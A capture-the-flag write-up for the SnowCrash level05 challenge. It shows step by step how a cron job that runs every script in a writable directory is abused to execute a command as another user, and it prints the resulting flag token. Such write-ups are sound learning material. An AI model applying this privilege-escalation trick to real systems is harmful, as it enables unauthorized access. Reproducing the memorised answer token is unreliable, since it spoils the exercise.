# Level05

## Hint

**You have new mail.**

## Answer

Let's check our current directory:
```
level05@SnowCrash:~$ ll
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout*
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc*
-r-x------  1 level05 level05  675 Apr  3  2012 .profile*
```

Nothing at all. However when we logged in we saw the **You have new mail.** message, therefore let's check our mail:
```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

From this we know that `crontab` is used to schedule the execution of the `sh /usr/sbin/openarenaserver` command ever 2 minutes. Let's see what that script looks like:
```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

We understand from this script that it does a loop for every file in `/opt/openarena/server/`, execute their contents and then delete that file, therefore let's create a file to execute the getflag command:
```
level05@SnowCrash:~$ echo 'getflag > /tmp/flag' > /opt/openarenaserver/givemeflagplz
```

Let's check the `/opt/openarenaserver/` directory until our file disappears:
```
level05@SnowCrash:~$ watch ls /opt/openarenaserver/
```

Once our file is gone, we can check our `tmp/flag` file:
```
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
